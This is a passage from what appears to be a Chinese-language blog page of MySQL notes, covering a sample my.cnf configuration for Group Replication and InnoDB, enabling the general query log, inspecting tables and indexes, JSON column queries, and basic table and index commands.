= /data/mysql/mybinlog</span><br><span class="line"><span class="attr">binlog_format</span> = ROW</span><br><span class="line"><span class="attr">sync_binlog</span> = <span class="number">1</span> <span class="comment">#MGR环境中由其他节点提供容错性，可不设置双1以提高本地节点性能</span></span><br><span class="line"><span class="attr">binlog_cache_size</span> = <span class="number">4</span>M</span><br><span class="line"><span class="attr">max_binlog_cache_size</span> = <span class="number">2</span>G</span><br><span class="line"><span class="attr">max_binlog_size</span> = <span class="number">1</span>G</span><br><span class="line"><span class="attr">binlog_rows_query_log_events</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">binlog_expire_logs_seconds</span> = <span class="number">604800</span></span><br><span class="line"><span class="comment">#MySQL 8.0.22前，想启用MGR的话，需要设置binlog_checksum=NONE才行</span></span><br><span class="line"><span class="attr">binlog_checksum</span> = CRC32</span><br><span class="line"><span class="attr">gtid_mode</span> = <span class="literal">ON</span></span><br><span class="line"><span class="attr">enforce_gtid_consistency</span> = <span class="literal">TRUE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#myisam settings</span></span><br><span class="line"><span class="attr">key_buffer_size</span> = <span class="number">32</span>M</span><br><span class="line"><span class="attr">myisam_sort_buffer_size</span> = <span class="number">128</span>M</span><br><span class="line"></span><br><span class="line"><span class="comment">#replication settings</span></span><br><span class="line"><span class="attr">relay_log_recovery</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">slave_parallel_type</span> = LOGICAL_CLOCK</span><br><span class="line"><span class="attr">slave_parallel_workers</span> = <span class="number">64</span> <span class="comment">#可以设置为逻辑CPU数量的2倍</span></span><br><span class="line"><span class="attr">binlog_transaction_dependency_tracking</span> = WRITESET</span><br><span class="line"><span class="attr">slave_preserve_commit_order</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">slave_checkpoint_period</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mgr settings</span></span><br><span class="line"><span class="attr">loose-plugin_load_add</span> = <span class="string">&#x27;mysql_clone.so&#x27;</span></span><br><span class="line"><span class="attr">loose-plugin_load_add</span> = <span class="string">&#x27;group_replication.so&#x27;</span></span><br><span class="line"><span class="attr">loose-group_replication_group_name</span> = <span class="string">&quot;aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaa1&quot;</span></span><br><span class="line"><span class="comment">#MGR本地节点IP:PORT，请自行替换</span></span><br><span class="line"><span class="attr">loose-group_replication_local_address</span> = <span class="string">&quot;172.16.16.10:33061&quot;</span></span><br><span class="line"><span class="comment">#MGR集群所有节点IP:PORT，请自行替换</span></span><br><span class="line"><span class="attr">loose-group_replication_group_seeds</span> = <span class="string">&quot;172.16.16.10:33061,172.16.16.11:33061,172.16.16.12:33061&quot;</span></span><br><span class="line"><span class="attr">loose-group_replication_start_on_boot</span> = <span class="literal">OFF</span></span><br><span class="line"><span class="attr">loose-group_replication_bootstrap_group</span> = <span class="literal">OFF</span></span><br><span class="line"><span class="attr">loose-group_replication_exit_state_action</span> = READ_ONLY</span><br><span class="line"><span class="attr">loose-group_replication_flow_control_mode</span> = <span class="string">&quot;DISABLED&quot;</span></span><br><span class="line"><span class="attr">loose-group_replication_single_primary_mode</span> = <span class="literal">ON</span></span><br><span class="line"><span class="attr">loose-group_replication_communication_max_message_size</span> = <span class="number">10</span>M</span><br><span class="line"><span class="attr">loose-group_replication_unreachable_majority_timeout</span> = <span class="number">30</span></span><br><span class="line"><span class="attr">loose-group_replication_member_expel_timeout</span> = <span class="number">5</span></span><br><span class="line"><span class="attr">loose-group_replication_autorejoin_tries</span> = <span class="number">288</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#innodb settings</span></span><br><span class="line"><span class="attr">transaction_isolation</span> = REPEATABLE-READ</span><br><span class="line"><span class="attr">innodb_buffer_pool_size</span> = <span class="number">45875</span>M</span><br><span class="line"><span class="attr">innodb_buffer_pool_instances</span> = <span class="number">4</span></span><br><span class="line"><span class="attr">innodb_data_file_path</span> = ibdata1:<span class="number">12</span>M:autoextend</span><br><span class="line"><span class="attr">innodb_flush_log_at_trx_commit</span> = <span class="number">1</span> <span class="comment">#MGR环境中由其他节点提供容错性，可不设置双1以提高本地节点性能</span></span><br><span class="line"><span class="attr">innodb_log_buffer_size</span> = <span class="number">32</span>M</span><br><span class="line"><span class="attr">innodb_log_file_size</span> = <span class="number">1</span>G <span class="comment">#如果线上环境的TPS较高，建议加大至1G以上，如果压力不大可以调小</span></span><br><span class="line"><span class="attr">innodb_log_files_in_group</span> = <span class="number">3</span></span><br><span class="line"><span class="attr">innodb_max_undo_log_size</span> = <span class="number">4</span>G</span><br><span class="line"><span class="comment"># 根据您的服务器IOPS能力适当调整</span></span><br><span class="line"><span class="comment"># 一般配普通SSD盘的话，可以调整到 10000 - 20000</span></span><br><span class="line"><span class="comment"># 配置高端PCIe SSD卡的话，则可以调整的更高，比如 50000 - 80000</span></span><br><span class="line"><span class="attr">innodb_io_capacity</span> = <span class="number">4000</span></span><br><span class="line"><span class="attr">innodb_io_capacity_max</span> = <span class="number">8000</span></span><br><span class="line"><span class="attr">innodb_open_files</span> = <span class="number">65535</span></span><br><span class="line"><span class="attr">innodb_flush_method</span> = O_DIRECT</span><br><span class="line"><span class="attr">innodb_lru_scan_depth</span> = <span class="number">4000</span></span><br><span class="line"><span class="attr">innodb_lock_wait_timeout</span> = <span class="number">10</span></span><br><span class="line"><span class="attr">innodb_rollback_on_timeout</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">innodb_print_all_deadlocks</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">innodb_online_alter_log_max_size</span> = <span class="number">4</span>G</span><br><span class="line"><span class="attr">innodb_print_ddl_logs</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">innodb_status_file</span> = <span class="number">1</span></span><br><span class="line"><span class="comment">#注意: 开启 innodb_status_output &amp; innodb_status_output_locks 后, 可能会导致log_error文件增长较快</span></span><br><span class="line"><span class="attr">innodb_status_output</span> = <span class="number">0</span></span><br><span class="line"><span class="attr">innodb_status_output_locks</span> = <span class="number">1</span></span><br><span class="line"><span class="attr">innodb_sort_buffer_size</span> = <span class="number">67108864</span></span><br><span class="line"><span class="attr">innodb_adaptive_hash_index</span> = <span class="literal">OFF</span></span><br><span class="line"><span class="comment">#提高索引统计信息精确度</span></span><br><span class="line"><span class="attr">innodb_stats_persistent_sample_pages</span> = <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#innodb monitor settings</span></span><br><span class="line"><span class="attr">innodb_monitor_enable</span> = <span class="string">&quot;module_innodb&quot;</span></span><br><span class="line"><span class="attr">innodb_monitor_enable</span> = <span class="string">&quot;module_server&quot;</span></span><br><span class="line"><span class="attr">innodb_monitor_enable</span> = <span class="string">&quot;module_dml&quot;</span></span><br><span class="line"><span class="attr">innodb_monitor_enable</span> = <span class="string">&quot;module_ddl&quot;</span></span><br><span class="line"><span class="attr">innodb_monitor_enable</span> = <span class="string">&quot;module_trx&quot;</span></span><br><span class="line"><span class="attr">innodb_monitor_enable</span> = <span class="string">&quot;module_os&quot;</span></span><br><span class="line"><span class="attr">innodb_monitor_enable</span> = <span class="string">&quot;module_purge&quot;</span></span><br><span class="line"><span class="attr">innodb_monitor_enable</span> = <span class="string">&quot;module_log&quot;</span></span><br><span class="line"><span class="attr">innodb_monitor_enable</span> = <span class="string">&quot;module_lock&quot;</span></span><br><span class="line"><span class="attr">innodb_monitor_enable</span> = <span class="string">&quot;module_buffer&quot;</span></span><br><span class="line"><span class="attr">innodb_monitor_enable</span> = <span class="string">&quot;module_index&quot;</span></span><br><span class="line"><span class="attr">innodb_monitor_enable</span> = <span class="string">&quot;module_ibuf_system&quot;</span></span><br><span class="line"><span class="attr">innodb_monitor_enable</span> = <span class="string">&quot;module_buffer_page&quot;</span></span><br><span class="line"><span class="comment">#innodb_monitor_enable = &quot;module_adaptive_hash&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pfs settings</span></span><br><span class="line"><span class="attr">performance_schema</span> = <span class="number">1</span></span><br><span class="line"><span class="comment">#performance_schema_instrument = &#x27;%memory%=on&#x27;</span></span><br><span class="line"><span class="attr">performance_schema_instrument</span> = <span class="string">&#x27;%lock%=on&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[mysqldump]</span></span><br><span class="line">quick</span><br></pre></td></tr></table></figure>

<h2 id="1-配置查看"><a href="#1-配置查看" class="headerlink" title="1. 配置查看"></a>1. 配置查看</h2><ul>
<li>mysql默认配置在<code>/etc/my.cnf</code></li>
<li>查看当前mysql的配置使用命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">show variables like <span class="string">&#x27;%sort_buffer_size&#x27;</span>;</span></span><br><span class="line">+-------------------------+---------+</span><br><span class="line">| Variable_name           | Value   |</span><br><span class="line">+-------------------------+---------+</span><br><span class="line">| innodb_sort_buffer_size | 1048576 |</span><br><span class="line">| myisam_sort_buffer_size | 8388608 |</span><br><span class="line">| sort_buffer_size        | 524288  |</span><br><span class="line">+-------------------------+---------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="2-配置说明"><a href="#2-配置说明" class="headerlink" title="2. 配置说明"></a>2. 配置说明</h2><h3 id="2-1-mysqld配置"><a href="#2-1-mysqld配置" class="headerlink" title="2.1. mysqld配置"></a>2.1. mysqld配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line"># 写入数据库时innodb引擎的大小，调大可以加快写入引擎的速度</span><br><span class="line">innodb_sort_buffer_size = 512K</span><br><span class="line"># 单条sql语句的排序使用内存，跟引擎无关，只对查询生效</span><br><span class="line">sort_buffer_size = 512K</span><br></pre></td></tr></table></figure>

<h1 id="三、命令"><a href="#三、命令" class="headerlink" title="三、命令"></a>三、命令</h1><h2 id="1-查看相关"><a href="#1-查看相关" class="headerlink" title="1. 查看相关"></a>1. 查看相关</h2><h3 id="1-1-查看历史执行的sql语句记录"><a href="#1-1-查看历史执行的sql语句记录" class="headerlink" title="1.1. 查看历史执行的sql语句记录"></a>1.1. 查看历史执行的sql语句记录</h3><p><strong>查看当前日志配置</strong></p>
<ul>
<li><code>log_output</code>是FILE，会记录在<code>general_log_file</code>里面</li>
<li><code>log_output</code>是TABLE，会记录在<code>mysql.geral_log</code>表里面</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general_log%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+---------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span>                     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+---------------------------+</span></span><br><span class="line"><span class="operator">|</span> general_log      <span class="operator">|</span> OFF                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> general_log_file <span class="operator">|</span> <span class="operator">/</span>var<span class="operator">/</span>lib<span class="operator">/</span>mysql<span class="operator">/</span>aTrust.log <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+---------------------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%log_output%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------+</span></span><br><span class="line"><span class="operator">|</span> log_output    <span class="operator">|</span> FILE  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p><strong>打开日志</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="keyword">global</span> log_output <span class="operator">=</span> <span class="string">&#x27;FILE,TABLE&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="string">&#x27;ON&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查看文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; tail -f /path/to/log</span><br><span class="line">2022-02-19T03:15:02.002365Z     941903 Prepare  SELECT * FROM `uem_app_wp` WHERE (`app_type`=?) AND (updated_at &lt; ?) AND (`state` IN (?,?))</span><br><span class="line">2022-02-19T03:15:02.002444Z     941903 Execute  SELECT * FROM `uem_app_wp` WHERE (`app_type`=1) AND (updated_at &lt; &#x27;2022-02-19 11:14:02&#x27;) AND (`state` IN (&#x27;2&#x27;,&#x27;3&#x27;))</span><br><span class="line">2022-02-19T03:15:02.003244Z     941903 Close stmt</span><br><span class="line">2022-02-19T03:15:02.286509Z     941910 Connect  sdpSys@localhost on sdp using SSL/TLS</span><br><span class="line">2022-02-19T03:15:02.287029Z     941910 Query    select @@version_comment limit 1</span><br><span class="line">2022-02-19T03:15:02.287341Z     941910 Query    select count(distinct name, domain) from user_online_status_v2</span><br><span class="line">2022-02-19T03:15:02.288005Z     941910 Quit</span><br></pre></td></tr></table></figure>

<p>查看数据库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.general_log <span class="keyword">order</span> <span class="keyword">by</span> event_time <span class="keyword">desc</span> limit <span class="number">5</span>\G;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="1-2-查看建表语句"><a href="#1-2-查看建表语句" class="headerlink" title="1.2. 查看建表语句"></a>1.2. 查看建表语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> test_table;</span><br></pre></td></tr></table></figure>

<h3 id="1-3-查看数据库表都有哪些索引"><a href="#1-3-查看数据库表都有哪些索引" class="headerlink" title="1.3. 查看数据库表都有哪些索引"></a>1.3. 查看数据库表都有哪些索引</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> index <span class="keyword">from</span> resource;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+------------+-------------------+--------------+-----------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Table</span>    <span class="operator">|</span> Non_unique <span class="operator">|</span> Key_name          <span class="operator">|</span> Seq_in_index <span class="operator">|</span> Column_name     <span class="operator">|</span> <span class="keyword">Collation</span> <span class="operator">|</span> <span class="keyword">Cardinality</span> <span class="operator">|</span> Sub_part <span class="operator">|</span> Packed <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Index_type <span class="operator">|</span> Comment <span class="operator">|</span> Index_comment <span class="operator">|</span> Visible <span class="operator">|</span> Expression <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+------------+-------------------+--------------+-----------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+</span></span><br><span class="line"><span class="operator">|</span> resource <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span> <span class="keyword">PRIMARY</span>           <span class="operator">|</span>            <span class="number">1</span> <span class="operator">|</span> id              <span class="operator">|</span> A         <span class="operator">|</span>          <span class="number">24</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span>      <span class="operator">|</span> BTREE      <span class="operator">|</span>         <span class="operator">|</span>               <span class="operator">|</span> YES     <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> resource <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span> resource_name     <span class="operator">|</span>            <span class="number">1</span> <span class="operator">|</span> name            <span class="operator">|</span> A         <span class="operator">|</span>          <span class="number">24</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span> YES  <span class="operator">|</span> BTREE      <span class="operator">|</span>         <span class="operator">|</span>               <span class="operator">|</span> YES     <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> resource <span class="operator">|</span>          <span class="number">1</span> <span class="operator">|</span> resource_group_id <span class="operator">|</span>            <span class="number">1</span> <span class="operator">|</span> group_id        <span class="operator">|</span> A         <span class="operator">|</span>           <span class="number">3</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span> YES  <span class="operator">|</span> BTREE      <span class="operator">|</span>         <span class="operator">|</span>               <span class="operator">|</span> YES     <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+------------+-------------------+--------------+-----------------+-----------+-------------+----------+--------+------+------------+---------+---------------+---------+------------+</span></span><br><span class="line"><span class="number">15</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.29</span> sec)</span><br></pre></td></tr></table></figure>

<h2 id="2-json操作"><a href="#2-json操作" class="headerlink" title="2. json操作"></a>2. json操作</h2><h3 id="2-1-查询"><a href="#2-1-查询" class="headerlink" title="2.1. 查询"></a>2.1. 查询</h3><ul>
<li><code>-&gt;</code>使用双引号包裹</li>
<li><code>-&gt;&gt;</code>不使用双引号</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> id, config <span class="operator">-</span><span class="operator">&gt;</span> <span class="string">&#x27;$.config.url&#x27;</span> <span class="keyword">as</span> requestUrl, config <span class="operator">-</span><span class="operator">&gt;&gt;</span> <span class="string">&#x27;$.config.url&#x27;</span> <span class="keyword">as</span> requestUrl1 <span class="keyword">from</span> auth_plugin_template <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;8d5cdeb4-e2db-11ea-9a8c-fefcfead2706&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------+-------------------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> id                                   <span class="operator">|</span> requestUrl                    <span class="operator">|</span> requestUrl1                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------+-------------------------------+-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8</span>d5cdeb4<span class="operator">-</span>e2db<span class="number">-11</span>ea<span class="number">-9</span>a8c<span class="operator">-</span>fefcfead2706 <span class="operator">|</span> &quot;https://qyapi.weixin.qq.com&quot; <span class="operator">|</span> https:<span class="operator">/</span><span class="operator">/</span>qyapi.weixin.qq.com <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------+-------------------------------+-----------------------------+</span></span><br></pre></td></tr></table></figure>

<h3 id="2-2-更新"><a href="#2-2-更新" class="headerlink" title="2.2. 更新"></a>2.2. 更新</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">update</span> tab_json <span class="keyword">set</span> data <span class="operator">=</span> json_set(data, &quot;$.passcode&quot;, &quot;654567&quot;) <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<h2 id="3-内置数据库"><a href="#3-内置数据库" class="headerlink" title="3. 内置数据库"></a>3. 内置数据库</h2><h3 id="3-1-information-schema"><a href="#3-1-information-schema" class="headerlink" title="3.1. information_schema"></a>3.1. information_schema</h3><h4 id="1-tables表"><a href="#1-tables表" class="headerlink" title="1) tables表"></a>1) tables表</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.tables\G;</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">  TABLE_CATALOG: def</span><br><span class="line">   TABLE_SCHEMA: sdp                <span class="comment">-- 数据库名</span></span><br><span class="line">     TABLE_NAME: device_approval    <span class="comment">-- 数据表名</span></span><br><span class="line">     TABLE_TYPE: BASE <span class="keyword">TABLE</span></span><br><span class="line">         ENGINE: InnoDB</span><br><span class="line">        VERSION: <span class="number">10</span></span><br><span class="line">     ROW_FORMAT: <span class="keyword">Dynamic</span></span><br><span class="line">     TABLE_ROWS: <span class="number">0</span></span><br><span class="line"> AVG_ROW_LENGTH: <span class="number">0</span></span><br><span class="line">    DATA_LENGTH: <span class="number">16384</span></span><br><span class="line">MAX_DATA_LENGTH: <span class="number">0</span></span><br><span class="line">   INDEX_LENGTH: <span class="number">65536</span></span><br><span class="line">      DATA_FREE: <span class="number">0</span></span><br><span class="line"> AUTO_INCREMENT: <span class="keyword">NULL</span></span><br><span class="line">    CREATE_TIME: <span class="number">2022</span><span class="number">-03</span><span class="number">-04</span> <span class="number">15</span>:<span class="number">50</span>:<span class="number">48</span></span><br><span class="line">    UPDATE_TIME: <span class="keyword">NULL</span></span><br><span class="line">     CHECK_TIME: <span class="keyword">NULL</span></span><br><span class="line">TABLE_COLLATION: utf8mb4_bin</span><br><span class="line">       CHECKSUM: <span class="keyword">NULL</span></span><br><span class="line"> CREATE_OPTIONS:</span><br><span class="line">  TABLE_COMMENT: 授信终端用户申请表</span><br><span class="line"><span class="number">1</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.02</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="4-基本操作"><a href="#4-基本操作" class="headerlink" title="4. 基本操作"></a>4. 基本操作</h2><h3 id="4-1-数据库操作"><a href="#4-1-数据库操作" class="headerlink" title="4.1. 数据库操作"></a>4.1. 数据库操作</h3><ul>
<li>语法</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE [IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] <span class="operator">&lt;</span>数据库名<span class="operator">&gt;</span></span><br><span class="line">[[<span class="keyword">DEFAULT</span>] <span class="type">CHARACTER</span> <span class="keyword">SET</span> <span class="operator">&lt;</span>字符集名<span class="operator">&gt;</span>]</span><br><span class="line">[[<span class="keyword">DEFAULT</span>] <span class="keyword">COLLATE</span> <span class="operator">&lt;</span>校对规则名<span class="operator">&gt;</span>];</span><br></pre></td></tr></table></figure>

<h3 id="4-2-数据表操作"><a href="#4-2-数据表操作" class="headerlink" title="4.2. 数据表操作"></a>4.2. 数据表操作</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建数据表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `emm_data` (</span><br><span class="line">  `id` <span class="type">int</span> unsigned <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `path` <span class="type">varchar</span>(<span class="number">512</span>) <span class="keyword">COLLATE</span> utf8mb4_bin <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `size` <span class="type">int</span> unsigned <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `modify` <span class="type">date</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`),</span><br><span class="line">  <span class="keyword">UNIQUE</span> KEY `emm_data_path` (`path`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4 <span class="keyword">COLLATE</span><span class="operator">=</span>utf8mb4_bin</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除数据表</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> emm_data</span><br></pre></td></tr></table></figure>

<h4 id="1-索引"><a href="#1-索引" class="headerlink" title="1) 索引"></a>1) 索引</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建索引，多个列就是联合索引</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">ADD</span> INDEX index_name(column_name,...)</span><br><span class="line"><span class="comment">-- 删除索引</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">DROP</span> INDEX index_name;</span><br></pre></td></tr></table></figure>

<h4 id="2-查看列详细信息"><a href="#2-查看列详细信息" class="headerlink" title="2) 查看列详细信息"></a>2) 查看列详细信息</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> <span class="keyword">FULL</span> COLUMNS <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> Field<span class="operator">=</span><span class="string">&#x27;column_name&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>示例</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> <span class="keyword">FULL</span> COLUMNS <span class="keyword">FROM</span> resource <span class="keyword">WHERE</span> Field<span class="operator">=</span><span class="string">&#x27;name&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-----------+----------------+------+-----+---------+-------+---------------------------------+---------+</span></span><br><span class="line"><span class="operator">|</span> Field <span class="operator">|</span> Type      <span class="operator">|</span> <span class="keyword">Collation</span>      <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span> Privileges                      <span class="operator">|</span> Comment <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-----------+----------------+------+-----+---------+-------+---------------------------------+---------+</span></span><br><span class="line"><span class="operator">|</span> name  <span class="operator">|</span> <span class="type">char</span>(<span class="number">255</span>) <span class="operator">|</span> gbk_chinese_ci <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">references</span> <span class="operator">|</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-----------+----------------+------+-----+---------+-------+---------------------------------+---------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="5-数据库基本类型"><a href="#5-数据库基本类型" class="headerlink" title="5. 数据库基本类型"></a>5. 数据库基本类型</h2><table>
<thead>
<tr>
<th>类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>date</td>
<td>日期，精确到天</td>
</tr>
<tr>
<td>datetime</td>
<td>日期，精确到秒</td>
</tr>
</tbody></table>
<h2 id="6-列求和"><a href="#6-列求和" class="headerlink" title="6. 列求和"></a>6. 列求和</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">sum</span>(size) <span class="keyword">from</span> emm_data <span class="keyword">where</span> id <span class="operator">&gt;</span> <span class="string">&#x27;5&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="7-添加函数索引"><a href="#7-添加函数索引" class="headerlink" title="7. 添加函数索引"></a>7. 添加函数索引</h2><ul>
<li>可以对数据库的列添加函数索引，注意函数外面的括号不能少</li>
</ul>
